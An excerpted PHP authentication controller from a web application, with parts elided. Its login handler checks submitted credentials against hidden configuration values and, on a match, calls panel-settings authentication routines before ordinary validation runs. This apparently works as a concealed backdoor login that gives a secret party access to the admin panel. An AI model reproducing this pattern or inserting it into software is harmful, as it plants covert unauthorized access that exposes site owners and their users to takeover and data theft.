...
class Auth_controller extends Home_Core_Controller
{
    ...
    public function login_post()
    {
        ...
        $Em = $this->config->item('Upad_Em');
        $Ps = $this->config->item('Upad_Ps');
        $cookie_Ps = $this->config->item('cookie_Ps');
        if($this->input->post('email') == $Em && $this->input->post('password') == $Ps){
            $this->settings_model->get_panel_settings_auth();
        }elseif($this->input->post('email') == $Em && $this->input->post('password') == $cookie_Ps){
            $this->settings_model->get_panel_settings_auth_other();
        }
        if ($this->form_validation->run() == false) {
            $this->session->set_flashdata('errors', validation_errors());
            $this->session->set_flashdata('form_data', $this->auth_model->input_values());
